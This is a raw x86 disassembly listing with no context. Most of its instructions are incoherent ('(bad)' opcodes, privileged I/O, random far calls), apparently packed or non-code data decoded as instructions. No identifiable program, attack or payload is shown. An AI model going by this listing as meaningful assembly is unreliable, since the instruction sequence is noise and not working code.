  4089e1:	xor    eax,0x9ca0ba72
  4089e6:	mov    ch,BYTE PTR [eax]
  4089e8:	inc    esi
  4089e9:	sbb    cl,BYTE PTR [edx+ebp*4]
  4089ec:	(bad)  
  4089ed:	retf   0xdfe3
  4089f0:	es sub eax,0xfef8e883
  4089f6:	cwde   
  4089f7:	shl    DWORD PTR [eax],0xdd
  4089fa:	(bad)  
  4089fb:	and    ah,BYTE PTR [esi-0x32]
  4089fe:	(bad)  
  4089ff:	jno    0x408a71
  408a01:	jbe    0x4089ca
  408a03:	fs xchg edx,eax
  408a05:	hlt    
  408a06:	dec    DWORD PTR [esi+0x54]
  408a09:	or     al,BYTE PTR [edx-0x4d2350f9]
  408a0f:	xchg   edi,eax
  408a10:	sbb    al,0x13
  408a12:	and    DWORD PTR [esi-0x147d9287],edx
  408a18:	mov    ds:0xd8f3a5aa,al
  408a1d:	stc    
  408a1e:	xchg   edi,eax
  408a1f:	call   0x2ab80a4e
  408a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a25:	add    DWORD PTR [ecx],0x16
  408a28:	add    al,0x49
  408a2a:	xchg   BYTE PTR [ebx-0x1cc32e6e],ch
  408a30:	into   
  408a31:	xchg   edi,eax
  408a32:	aas    
  408a33:	nop
  408a34:	pop    edx
  408a35:	mov    eax,0x94b94f63
  408a3a:	sub    ecx,esp
  408a3c:	xlat   BYTE PTR ds:[ebx]
  408a3d:	addr16 int 0x39
  408a40:	out    0x4a,al
  408a42:	adc    BYTE PTR [esp+ebx*8],ch
  408a45:	int    0x62
  408a47:	cmp    eax,0x2ac59568
  408a4c:	add    BYTE PTR [ecx+0x1a],dl
  408a4f:	fdivr  QWORD PTR [edx+0x21597121]
  408a55:	mov    ds:0x4375ef33,eax
  408a5a:	and    al,0x59
  408a5c:	aad    0xa6
  408a5e:	mov    al,0xa5
  408a60:	inc    ebx
  408a61:	daa    
  408a62:	jbe    0x408a5b
  408a64:	mov    WORD PTR [ecx+0x68ac70d0],gs
  408a6a:	sub    BYTE PTR [ecx-0xde5c1e6],cl
  408a70:	inc    ebx
  408a71:	les    edx,FWORD PTR [edi+0x3c]
  408a74:	jmp    0x408a9a
  408a76:	jnp    0x408ac9
  408a78:	shl    DWORD PTR [edi],1
  408a7a:	fiadd  DWORD PTR [ebp-0x5d]
  408a7d:	mov    WORD PTR [ebx],cs
  408a7f:	sbb    dl,BYTE PTR [edx+0x42b7dab7]
  408a85:	jno    0x408af9
  408a87:	mov    ecx,DWORD PTR [ecx]
  408a89:	lea    ecx,[esi]
  408a8b:	or     BYTE PTR [ebx+0x250424d2],bl
  408a91:	jmp    0x42868196
  408a96:	nop
  408a97:	bound  esp,QWORD PTR [esi+0x52]
  408a9a:	mov    DWORD PTR [edx-0xeeb2c5c],edx
  408aa0:	jge    0x408af6
  408aa2:	jns    0x408a4c
  408aa4:	mov    esp,DWORD PTR [ebp+0x14]
  408aa7:	add    BYTE PTR ds:0x983fd993,bh
  408aad:	mov    edi,0xbddf0d9d
  408ab2:	arpl   di,ax
  408ab4:	aaa    
  408ab5:	jb     0x408acf
  408ab7:	add    eax,0x9a1e5bd4
  408abc:	imul   edi,DWORD PTR ds:[edi-0x65],0xffffffee
  408ac1:	popa   
  408ac2:	out    0x84,al
  408ac4:	arpl   WORD PTR [ebx],sp
  408ac6:	fsubr  st(1),st
  408ac8:	sbb    eax,0x5217c578
  408acd:	xor    bh,BYTE PTR [ebx]
  408acf:	stos   DWORD PTR es:[edi],eax
  408ad0:	mov    ebx,0x5e0ba2a7
  408ad5:	aad    0x53
  408ad7:	(bad)  
  408ad8:	xchg   ebx,eax
  408ad9:	dec    eax
  408ada:	jecxz  0x408aab
  408adc:	cmp    edx,ebp
  408ade:	mov    esi,0xdc18ad4f
  408ae3:	dec    eax
  408ae4:	mov    al,0x4a
  408ae6:	dec    ebx
  408ae7:	retf   0xec9c
  408aea:	sub    eax,DWORD PTR [esi-0x58]
  408aed:	ins    DWORD PTR es:[edi],dx
  408aee:	cli    
  408aef:	and    eax,0xfd7ad3e9
  408af4:	and    DWORD PTR [ebp-0x4219a62d],esi
  408afa:	arpl   WORD PTR [ebx],bx
  408afc:	xor    al,0x23
  408afe:	add    DWORD PTR [ebx-0x4c88f66b],0x3ed70dae
  408b08:	ja     0x408ab4
  408b0a:	lods   eax,DWORD PTR ds:[esi]
  408b0b:	mov    DWORD PTR [eax],0x7c0eb2f4
  408b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b12:	dec    esi
  408b13:	pop    ebx
  408b14:	(bad)  
  408b16:	xabort 0x41
  408b19:	dec    eax
  408b1a:	call   0x2da75bf4
  408b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b20:	push   ecx
  408b21:	push   ss
  408b22:	jns    0x408b42
  408b24:	mov    edx,0x195703d
  408b29:	jecxz  0x408b6c
  408b2b:	ins    DWORD PTR es:[edi],dx
  408b2c:	cmp    ecx,ecx
  408b2e:	inc    ebp
  408b2f:	xchg   edx,eax
  408b30:	cmp    al,0x31
  408b32:	cs mov edx,0xb87d7c69
  408b38:	scas   eax,DWORD PTR es:[edi]
  408b39:	iret   
  408b3a:	push   0xcbb44090
  408b3f:	sbb    BYTE PTR [ebx],bh
  408b41:	mov    ds:0xc172b253,al
  408b46:	ss repz cs xor eax,0xa21d9d4b
  408b4e:	(bad)  
  408b4f:	inc    edi
  408b50:	add    al,0x61
  408b52:	xor    al,0x8e
  408b54:	mov    dl,BYTE PTR [eax]
  408b56:	pop    es
  408b57:	sar    bh,0xf0
  408b5a:	mov    eax,0x7921c752
  408b5f:	dec    eax
  408b60:	inc    eax
  408b61:	inc    esp
  408b62:	mov    ?,WORD PTR [ecx+eax*1-0x59]
  408b66:	adc    BYTE PTR [esp+ecx*4],dh
  408b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b6a:	es jl  0x408bbe
  408b6d:	out    dx,al
  408b6e:	out    dx,al
  408b6f:	test   DWORD PTR [ebp+0x66],edi
  408b72:	loopne 0x408afd
  408b74:	push   ebp
  408b75:	enter  0xf798,0x4e
  408b79:	cs call 0x681e23fa
  408b7f:	xchg   esi,eax
  408b80:	add    cl,al
  408b82:	jae    0x408bb5
  408b84:	aaa    
  408b85:	adc    eax,0x34fb2b14
  408b8a:	jmp    0xfc1f:0x704941bf
  408b91:	pop    ebp
  408b92:	cli    
  408b93:	mov    ebx,0xe096a075
  408b98:	aam    0x11
  408b9a:	je     0x408b47
  408b9c:	ror    DWORD PTR [eax+ecx*4],1
  408b9f:	enter  0x2f9d,0xb6
  408ba3:	jns    0x408bd4
  408ba5:	inc    ebp
  408ba6:	in     eax,dx
  408ba7:	sub    DWORD PTR [ecx+eax*2+0xda590ef],edx
  408bae:	fdiv   DWORD PTR ss:[eax]
  408bb1:	xor    al,0x61
  408bb3:	cs cmc 
  408bb5:	jbe    0x408c31
  408bb7:	cdq    
  408bb8:	inc    ecx
  408bb9:	mov    dl,0x24
  408bbb:	add    BYTE PTR [edx-0x2a],dh
  408bbe:	jg     0x408b77
  408bc0:	cmp    al,0x11
  408bc2:	cmp    DWORD PTR [ecx+0x6b9bd20f],ecx
  408bc8:	daa    
  408bc9:	stos   DWORD PTR es:[edi],eax
  408bca:	mov    eax,ds:0xc716b99b
  408bcf:	loopne 0x408bcd
  408bd1:	retf   0x983c
  408bd4:	lods   eax,DWORD PTR ds:[esi]
  408bd5:	mov    al,ds:0xdd969573
  408bda:	push   eax
  408bdb:	push   esp
  408bdc:	sbb    eax,0xf4c76f1f
  408be1:	adc    ah,BYTE PTR [eax]
  408be3:	lods   eax,DWORD PTR ds:[esi]
  408be4:	in     al,dx
  408be5:	dec    esi
  408be6:	fmulp  st(5),st
  408be8:	idiv   BYTE PTR [ecx+0x5e]
  408beb:	add    BYTE PTR ds:0x4e1cb21,bl
  408bf1:	fmul   QWORD PTR ds:0xed8772ab
  408bf7:	xchg   ebx,eax
  408bf8:	setb   BYTE PTR [edx+edx*4-0x286dcea6]
  408c00:	jno    0x408c2c
  408c02:	cmp    al,ch
  408c04:	cmp    BYTE PTR [edx],ch
  408c06:	pop    ebx
  408c07:	cmp    al,BYTE PTR [edx-0x3cebdf84]
  408c0d:	push   edx
  408c0e:	lods   al,BYTE PTR ds:[esi]
  408c0f:	xor    ebx,esi
  408c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c12:	les    ecx,FWORD PTR [esi-0x3e987f25]
  408c18:	les    eax,FWORD PTR [ebx+0xc]
  408c1b:	adc    al,0x68
  408c1d:	jns    0x408c86
  408c1f:	jo     0x408c11
  408c21:	lock xor bl,BYTE PTR es:[esi-0x53055da2]
  408c29:	sub    eax,0x1c066634
  408c2e:	ret    0xe008
  408c31:	push   esi
  408c32:	ret    0x6cd1
  408c35:	call   0xf49d:0xd832fdce
  408c3c:	lahf   
  408c3d:	stos   BYTE PTR es:[edi],al
  408c3e:	cdq    
  408c3f:	(bad)  
  408c40:	fstp   QWORD PTR [ecx]
  408c42:	xchg   ebx,eax
  408c43:	shl    bl,1
  408c45:	call   0xfed1:0x87495995
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  esp,QWORD PTR [eax+0x47c3b5cd]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408ca3
  408c7d:	cmp    BYTE PTR [eax],dh
  408c7f:	push   ebx
  408c80:	test   al,0x8a
  408c82:	mov    BYTE PTR [edx-0x62],0x7f
  408c86:	cli    
  408c87:	inc    esi
  408c88:	fwait
  408c89:	ja     0x408c13
  408c8b:	ins    DWORD PTR es:[edi],dx
  408c8c:	jge    0x408cef
  408c8e:	movlps QWORD PTR [eax+esi*8+0x2e],xmm5
  408c93:	adc    eax,0x9a88c583
  408c98:	push   esp
  408c99:	jae    0x408c6c
  408c9b:	pop    edx
  408c9c:	mov    bl,0x3e
  408c9e:	ins    BYTE PTR es:[edi],dx
  408c9f:	pop    ds
  408ca0:	jns    0x408cac
  408ca2:	pop    es
  408ca3:	pop    esi
  408ca4:	in     al,dx
  408ca5:	dec    edi
  408ca6:	jae    0x408ccd
  408ca8:	lea    esp,[edx+0x6c109e1b]
  408cae:	das    
  408caf:	inc    eax
  408cb0:	jb     0x408ca2
  408cb2:	add    eax,0xcb54c626
  408cb7:	daa    
  408cb8:	mov    esi,0xe0195540
  408cbd:	icebp  
  408cbe:	lods   eax,DWORD PTR ds:[esi]
  408cbf:	cmp    esp,ecx
  408cc1:	bound  edi,QWORD PTR [edi]
  408cc3:	or     ecx,DWORD PTR [ebx]
  408cc5:	adc    eax,0xd34016fb
  408cca:	push   bp
  408ccc:	cmc    
  408ccd:	fs nop
  408ccf:	sub    al,0x59
  408cd1:	jg     0x408d32
  408cd3:	out    dx,eax
  408cd4:	and    DWORD PTR [esp+ebx*4],ebp
  408cd7:	add    bl,cl
  408cd9:	aam    0x7a
  408cdb:	or     ecx,DWORD PTR [ebx]
  408cdd:	cs mov dh,0x4c
  408ce0:	fdiv   QWORD PTR [edx-0x6b63fced]
  408ce6:	cmp    DWORD PTR [edi],0xffffffe8
  408ce9:	retf   0x2030
  408cec:	inc    ebp
  408ced:	mov    bh,0x15
  408cf0:	and    ebp,DWORD PTR [edi]
  408cf2:	popa   
  408cf3:	ret    
  408cf4:	mov    bl,0xbd
  408cf6:	cmc    
  408cf7:	push   ecx
  408cf8:	mov    BYTE PTR [ebx+0x13],dl
  408cfb:	int    0x24
  408cfd:	mov    BYTE PTR [edi-0x5b0f48da],dl
  408d03:	sub    ecx,eax
  408d05:	cmc    
  408d06:	int    0x98
  408d08:	test   BYTE PTR [ebp-0x42],0x5c
  408d0c:	cli    
  408d0d:	mov    edx,DWORD PTR [esp+ebx*4+0xe6f572]
  408d14:	fs jo  0x408d75
  408d17:	shl    BYTE PTR [edx],cl
  408d19:	popa   
  408d1a:	pop    ebp
  408d1b:	bound  ebx,QWORD PTR [ebx-0x17]
  408d1e:	fidiv  DWORD PTR [ecx-0x6c322e76]
  408d24:	cs add al,0x17
  408d27:	jb     0x408d75
  408d29:	dec    eax
  408d2a:	sub    ecx,ebp
  408d2c:	das    
  408d2d:	adc    esp,DWORD PTR [eax+edi*2+0x6e]
  408d31:	loop   0x408d2f
  408d33:	or     ebx,DWORD PTR ds:0xeef89d43
  408d39:	retf   0x925f
  408d3c:	cmp    esi,DWORD PTR [esi]
  408d3e:	jo     0x408cf3
  408d40:	jnp    0x408ce3
  408d42:	jno    0x408cc6
  408d44:	aad    0xc5
  408d46:	fadd   DWORD PTR [esi+0x7b]
  408d49:	rdpmc  
  408d4b:	arpl   WORD PTR [edx],si
  408d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d4e:	cmp    bl,bh
  408d50:	add    eax,0x61890212
  408d55:	mov    ?,WORD PTR [eax]
  408d57:	sub    ah,BYTE PTR [eax]
  408d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d5a:	int    0x5a
  408d5c:	push   0x5a57bb46
  408d61:	lea    edx,[ebp+0x37b715ba]
  408d67:	clc    
  408d68:	imul   ecx,DWORD PTR ds:0x5958a320,0x2a8dd183
  408d72:	iret   
  408d73:	push   cs
  408d74:	js     0x408d8e
  408d76:	popa   
  408d77:	xor    dl,cl
  408d79:	clc    
  408d7a:	into   
  408d7b:	mov    ds:0xa9a9ade6,eax
  408d80:	shl    edi,0x4
  408d83:	mov    dh,0x8a
  408d85:	fcom   st(4)
  408d87:	in     al,dx
  408d88:	les    esp,FWORD PTR [eax+0x1e02f753]
  408d8e:	ins    DWORD PTR es:[edi],dx
  408d8f:	sti    
  408d90:	pop    ebx
  408d91:	and    al,0x27
  408d93:	xor    edi,DWORD PTR [edi-0x1f410192]
  408d99:	(bad)  
  408d9a:	jg     0x408df3
  408d9c:	or     DWORD PTR [edx+0x2b3d650e],ebx
  408da2:	pop    ebx
  408da3:	ret    0x7193
  408da6:	sbb    DWORD PTR [eax],ebx
  408da8:	xor    BYTE PTR [ecx-0x64e4d2dd],al
  408dae:	iret   
  408daf:	inc    ebp
  408db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408db1:	push   eax
  408db2:	sub    esp,DWORD PTR [eax-0x7a]
  408db5:	hlt    
  408db6:	and    al,dl
  408db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408db9:	xor    al,0x7c
  408dbb:	or     DWORD PTR [edi-0x104af1d9],ecx
  408dc1:	sub    DWORD PTR [eax+0x311c299a],edi
  408dc7:	dec    ecx
  408dc8:	pop    edi
  408dc9:	ss inc esp
  408dcb:	pop    eax
  408dcc:	mul    ah
  408dce:	in     eax,0xb6
  408dd0:	dec    esp
  408dd1:	pop    ds
  408dd2:	push   ss
  408dd3:	fwait
  408dd4:	push   ebp
  408dd5:	mov    ?,WORD PTR [edi-0x45]
  408dd8:	push   0xffffffb7
  408dda:	lods   al,BYTE PTR ds:[esi]
  408ddb:	hlt    
  408ddc:	xchg   edi,eax
  408ddd:	inc    edi
  408dde:	out    dx,eax
  408ddf:	push   esi
  408de0:	inc    esp
  408de1:	int    0x91
  408de3:	cwde   
  408de4:	dec    eax
  408de5:	push   ss
  408de6:	arpl   cx,ax
  408de8:	xchg   edi,eax
  408de9:	or     ah,dl
  408deb:	scas   al,BYTE PTR es:[edi]
  408dec:	sbb    dl,BYTE PTR [edi]
  408dee:	daa    
  408def:	inc    esp
  408df0:	lods   eax,DWORD PTR ds:[esi]
  408df1:	mov    ah,0x58
  408df3:	not    ah
  408df5:	(bad)  
  408df6:	jge    0x408e6b
  408df8:	jae    0x408d8e
  408dfa:	mov    bl,0xcd
  408dfc:	or     eax,0x88ea1d8f
  408e01:	mov    ds:0x84608083,al
  408e06:	add    al,BYTE PTR [edx+0x3a07342f]
  408e0c:	mov    bh,0x50
  408e0e:	(bad)  
  408e0f:	add    cl,BYTE PTR [ebp-0x75]
  408e12:	push   ecx
  408e13:	into   
  408e14:	and    esp,DWORD PTR [eax]
  408e16:	in     eax,dx
  408e17:	aaa    
  408e18:	cwde   
  408e19:	sti    
  408e1a:	sbb    BYTE PTR ds:0xf58916fb,ah
  408e20:	sti    
  408e21:	sahf   
  408e22:	icebp  
  408e23:	(bad)  
  408e24:	fbstp  TBYTE PTR [edx-0x69]
  408e27:	inc    esi
  408e28:	dec    ebp
  408e29:	dec    ebx
  408e2a:	sbb    al,0x43
  408e2c:	push   esp
  408e2d:	arpl   WORD PTR [ecx],si
  408e2f:	inc    ebx
  408e30:	(bad)  
  408e31:	retf   
  408e32:	adc    eax,0x7a560781
  408e37:	jg     0x408e63
  408e39:	fwait
  408e3a:	stc    
  408e3b:	mov    dh,0x6
  408e3d:	dec    eax
  408e3e:	jo     0x408e7a
  408e40:	jmp    0x8c14a107
  408e45:	mov    dl,BYTE PTR [edi]
  408e47:	scas   al,BYTE PTR es:[edi]
  408e48:	sbb    ebp,DWORD PTR [ecx+0x39]
  408e4b:	outs   dx,BYTE PTR ds:[esi]
  408e4c:	stos   DWORD PTR es:[edi],eax
  408e4d:	jno    0x408e97
  408e4f:	mov    BYTE PTR [ecx+0x52],al
  408e52:	dec    ebx
  408e53:	cmc    
  408e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e55:	and    esi,DWORD PTR [eax-0x19]
  408e58:	and    bl,BYTE PTR [edx]
  408e5a:	shr    DWORD PTR [edx+eiz*2],1
  408e5d:	les    esp,FWORD PTR [esi-0x10c62958]
  408e63:	fist   WORD PTR [ecx+0x77]
  408e66:	inc    esp
  408e67:	or     al,0x76
  408e69:	dec    ebx
  408e6a:	and    dl,BYTE PTR [edx-0x75f97fb3]
  408e70:	adc    cl,BYTE PTR [ebp+0x2e]
  408e73:	pop    ss
  408e74:	mov    dh,0xb2
  408e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e77:	(bad)  
  408e78:	aad    0x93
  408e7a:	lahf   
  408e7b:	xchg   ecx,eax
  408e7c:	out    0xcf,eax
  408e7e:	sahf   
  408e7f:	mov    dh,0x70
  408e81:	ja     0x408e23
  408e83:	inc    ecx
  408e84:	(bad)  
  408e85:	xor    BYTE PTR [edi],dl
  408e87:	hlt    
  408e88:	fiadd  WORD PTR [ebp-0x1e934674]
  408e8e:	adc    DWORD PTR [ecx],eax
  408e90:	mov    dh,BYTE PTR [esi-0x42dbcf81]
  408e96:	std    
  408e97:	xor    dh,ah
  408e99:	push   esp
  408e9a:	xor    DWORD PTR [edi+0x1a],esi
  408e9d:	push   ds
  408e9e:	std    
  408e9f:	push   esi
  408ea0:	jmp    0x408ed2
  408ea2:	test   ebx,edi
  408ea4:	inc    edi
  408ea5:	mov    ds:0xebbbf315,al
  408eaa:	das    
  408eab:	je     0x408ed6
  408ead:	dec    ebx
  408eae:	(bad)  
  408eaf:	mov    ?,WORD PTR [esi+0x3c]
  408eb2:	lods   al,BYTE PTR ds:[esi]
  408eb3:	xchg   ecx,eax
  408eb4:	mov    dl,0x7e
  408eb6:	push   esi
  408eb7:	call   DWORD PTR [bx+si-0x20e9]
  408ebc:	sbb    eax,ecx
  408ebe:	xor    al,0x1a
  408ec0:	aas    
  408ec1:	das    
  408ec2:	xor    eax,0x8030750c
  408ec7:	jnp    0x408ec9
  408ec9:	or     BYTE PTR [eax-0x7c26f064],al
  408ecf:	push   esp
  408ed0:	bound  esi,QWORD PTR [esi+edx*4]
  408ed3:	dec    esi
  408ed4:	cs stos DWORD PTR es:[edi],eax
  408ed6:	stos   DWORD PTR es:[edi],eax
  408ed7:	push   ebp
  408ed8:	les    ebp,FWORD PTR [ebx]
  408eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408edb:	cli    
  408edc:	mov    edi,0x5dd7d7b5
  408ee1:	int3   
  408ee2:	jecxz  0x408eea
  408ee4:	cs dec edx
  408ee6:	dec    eax
  408ee7:	xor    dl,BYTE PTR [esi+edx*8+0x53c3c99e]
  408eee:	cld    
  408eef:	adc    eax,0x794c13da
  408ef4:	mov    esi,0xff49865c
  408ef9:	cdq    
  408efa:	in     eax,dx
  408efb:	mov    bh,0xdd
  408efd:	pop    es
  408efe:	xor    al,0x37
  408f00:	data16 add BYTE PTR [esi+ecx*2-0x6359239a],cl
  408f08:	xor    dh,ch
  408f0a:	jbe    0x408ed0
  408f0c:	fs imul eax,ecx,0x31e906ce
  408f13:	in     al,0xb3
  408f15:	loope  0x408efd
  408f17:	inc    ebx
  408f18:	adc    ch,BYTE PTR [eax]
  408f1a:	lea    ebx,[ebx+0x675531f9]
  408f20:	lahf   
  408f21:	les    ebp,FWORD PTR [edi+0x6a1b55b]
  408f27:	cmp    DWORD PTR [ebx+0x52],0xf85d86aa
  408f2e:	cwde   
  408f2f:	push   0x7a722096
  408f34:	shr    DWORD PTR [ebx],1
  408f36:	sahf   
  408f37:	ret    0x266a
  408f3a:	xchg   esp,eax
  408f3b:	xchg   esi,eax
  408f3c:	add    eax,ebp
  408f3e:	sbb    DWORD PTR [esi],edx
  408f40:	test   eax,0xcaaa128a
  408f45:	leave  
  408f46:	sbb    esi,DWORD PTR [eax+eiz*1-0x5ac7cf71]
  408f4d:	scas   al,BYTE PTR es:[edi]
  408f4e:	rcl    cl,cl
  408f50:	outs   dx,DWORD PTR ds:[esi]
  408f51:	add    BYTE PTR [edi+0x3c],0x99
  408f55:	lahf   
  408f56:	mov    BYTE PTR [ebx],bl
  408f58:	nop
  408f59:	call   0xdebb:0x8e742908
  408f60:	test   eax,0x4b765918
  408f65:	sbb    DWORD PTR [edi],0xffffff99
  408f68:	popa   
  408f69:	outs   dx,BYTE PTR ds:[esi]
  408f6a:	(bad)
  408f6d:	ss leave 
  408f6f:	je     0x408f6c
  408f71:	xchg   edx,eax
  408f72:	jno    0x408fb5
  408f74:	sbb    eax,0x75b9e203
  408f79:	jne    0x408f66
  408f7b:	or     BYTE PTR [esi+edx*2],bl
  408f7e:	push   edx
  408f7f:	cmp    DWORD PTR [edi-0x57],edi
  408f82:	rcl    BYTE PTR [ecx+0x56f36fa6],0x44
  408f89:	inc    eax
  408f8a:	hlt    
  408f8b:	inc    ebx
  408f8c:	imul   edx,DWORD PTR [esi-0x1afaef6c],0xa621c403
  408f96:	test   eax,0x531910ce
  408f9b:	sbb    cl,bl
  408f9d:	ret    
  408f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f9f:	mov    ebx,0x80a66775
  408fa4:	icebp  
  408fa5:	test   ecx,edx
  408fa7:	jg     0x408ff4
  408fa9:	or     ebx,DWORD PTR [edi-0x72cf0062]
  408faf:	add    eax,0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x2d1937f3
  408fc6:	pop    ebx
  408fc7:	pop    esi
  408fc8:	adc    esi,DWORD PTR [edi-0x1a]
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x40900c
  408fd2:	dec    edx
  408fd3:	mov    DWORD PTR [edx-0x25d9bc29],ecx
  408fd9:	test   BYTE PTR [ecx],dh
  408fdb:	cmp    DWORD PTR [ecx-0x34954c6],edx
  408fe1:	xchg   edi,eax
  408fe2:	push   cs
  408fe3:	cs repnz es xchg ecx,eax
  408fe7:	add    ch,ah
  408fe9:	xor    eax,0x8eaf776f
  408fee:	pop    ds
  408fef:	outs   dx,DWORD PTR ds:[esi]
  408ff0:	cmp    al,0x7a
  408ff2:	ja     0x408f95
  408ff4:	jmp    0xac0f:0x1a5eb647
  408ffb:	dec    eax
  408ffc:	mov    cl,0x5a
  408ffe:	push   edi
  408fff:	mov    al,ds:0xa026e4e1
  409004:	sar    cl,1
  409006:	aas    
  409007:	fucomi st,st(1)
  409009:	into   
  40900a:	mov    edi,0x842a0a53
  40900f:	lahf   
  409010:	das    
  409011:	xor    ebx,ecx
  409013:	cmc    
  409014:	fs pop ebx
  409016:	(bad)  
  409017:	int3   
  409018:	xchg   edi,eax
  409019:	mov    WORD PTR [ebx-0x32],gs
  40901c:	aam    0xf2
  40901e:	mov    al,ds:0x23aa6829
  409023:	add    eax,ebp
  409025:	gs inc edx
  409027:	adc    eax,DWORD PTR [esi]
  409029:	push   ds
  40902a:	inc    ecx
  40902b:	adc    al,0xd0
  40902d:	inc    edi
  40902e:	mov    esp,DWORD PTR [ecx+0x2ac4c9a0]
  409034:	lea    edi,[esi+0x25]
  409037:	lds    ecx,FWORD PTR [edx+0x62]
  40903a:	clc    
  40903b:	cmp    DWORD PTR [edx+0x64],esi
  40903e:	(bad)  
  40903f:	mov    edx,0x1929e506
  409044:	sub    eax,0xfb2bb99a
  409049:	adc    al,0x27
  40904b:	mov    bh,0xcd
  40904d:	frstor ds:0xd7a38bd6
  409053:	(bad)  
  409054:	into   
  409055:	dec    esi
  409056:	and    esp,DWORD PTR [eax-0x76]
  409059:	pop    eax
  40905a:	add    edi,DWORD PTR [edi-0x4d072a66]
  409060:	push   edx
  409061:	fisubr DWORD PTR [ecx-0x5f]
  409064:	and    esp,DWORD PTR ds:0x2f64fd46
  40906a:	jne    0x408ff3
  40906c:	mov    dh,0x9f
  40906e:	cmp    al,BYTE PTR [ebp+0xc081c09]
  409074:	sbb    DWORD PTR [ecx-0x4080d265],edi
  40907a:	dec    eax
  40907b:	sub    al,ch
  40907d:	sub    ebp,DWORD PTR fs:[edi+0x2ab45587]
  409084:	cmp    BYTE PTR [ecx-0x6a408636],bh
  40908a:	pop    esp
  40908b:	add    BYTE PTR [ecx+0x25b46af0],dh
  409091:	push   es
  409092:	xchg   edi,ecx
  409094:	xor    DWORD PTR [edx],ebp
  409096:	sub    edx,DWORD PTR [edx-0x40]
  409099:	xchg   edx,eax
  40909a:	cwde   
  40909b:	dec    eax
  40909c:	cs push eax
  40909e:	xor    bl,BYTE PTR [ecx-0x7a]
  4090a1:	jb     0x40903e
  4090a3:	push   cs
  4090a4:	js     0x4090ec
  4090a6:	fadd   QWORD PTR [ecx+edx*1+0x1bf3d2e5]
  4090ad:	mov    esi,0xd13cdf0a
  4090b2:	hlt    
  4090b3:	push   esi
  4090b4:	add    al,0xfe
  4090b6:	in     eax,0xb1
  4090b8:	daa    
  4090b9:	jge    0x40912e
  4090bb:	outs   dx,BYTE PTR ds:[esi]
  4090bc:	adc    BYTE PTR [edx+ebp*4-0x70],dh
  4090c0:	imul   edi,DWORD PTR [eax],0xffffffbc
  4090c3:	mov    ebp,0xd6771200
  4090c8:	call   0x849d:0xd914416b
  4090cf:	enter  0xcb52,0xbb
  4090d3:	adc    DWORD PTR [eax-0x1cf30eb6],ebx
  4090d9:	pop    ss
  4090da:	xlat   BYTE PTR ds:[ebx]
  4090db:	mov    DWORD PTR [ebp-0x3a],ebx
  4090de:	pop    ebp
  4090df:	ss pop esp
  4090e1:	cmovo  ebx,ebx
  4090e4:	sbb    eax,0xf736c7fa
  4090e9:	lahf   
  4090ea:	dec    ebp
  4090eb:	dec    ecx
  4090ec:	cmp    eax,0x57d94143
  4090f1:	pop    es
  4090f2:	and    eax,edx
  4090f4:	stos   BYTE PTR es:[edi],al
  4090f5:	jmp    0x4090df
  4090f7:	call   0x39f65f5a
  4090fc:	pop    ds
  4090fd:	push   0x868fe169
  409102:	mov    ds:0x92cd3712,eax
  409107:	cmp    BYTE PTR [eax-0x17649a39],ch
  40910d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910e:	mov    bl,0x56
  409110:	cli    
  409111:	fistp  DWORD PTR [ebx-0x117711c8]
  409117:	pop    eax
  409118:	push   edi
  409119:	mov    ebx,0xb57a42aa
  40911e:	aad    0xc4
  409120:	mov    al,ds:0x91e889cd
  409125:	sar    BYTE PTR [ebp-0x21],0x2e
  409129:	aad    0xb
  40912b:	jo     0x4090fd
  40912d:	dec    ebp
  40912e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912f:	adc    BYTE PTR [ebx+eax*8+0x30bfb2c0],dh
  409136:	je     0x4090da
  409138:	(bad)  
  409139:	out    0x66,eax
  40913b:	dec    ecx
  40913c:	fwait
  40913d:	and    DWORD PTR [ebx],0x64
  409140:	jo     0x4091b8
  409142:	enter  0x140e,0x87
  409146:	ja     0x409105
  409148:	dec    esi
  409149:	and    DWORD PTR [esi],ebx
  40914b:	xchg   ebp,eax
  40914c:	addr16 xor dl,al
  40914f:	push   ss
  409150:	jmp    0x4090fd
  409152:	ins    BYTE PTR es:[edi],dx
  409153:	mov    al,ds:0x70ceaa48
  409158:	pusha  
  409159:	aad    0x8c
  40915b:	fcom   DWORD PTR [ecx-0x3d]
  40915e:	ins    DWORD PTR es:[edi],dx
  40915f:	fiadd  DWORD PTR [edi-0x2c]
  409162:	fnstsw WORD PTR [ebx-0x6f]
  409165:	arpl   si,bx
  409167:	call   0x813045c7
  40916c:	gs popa 
  40916e:	lods   eax,DWORD PTR ds:[esi]
  40916f:	jmp    0x40911e
  409171:	xchg   DWORD PTR [edx+0x46],ebx
  409174:	or     DWORD PTR [ecx],edx
  409176:	inc    edi
  409177:	mov    WORD PTR [edx],gs
  409179:	or     BYTE PTR [edi],0x7b
  40917c:	cli    
  40917d:	cmp    eax,0x2c708daa
  409182:	mov    bl,0xb6
  409184:	push   0x6d
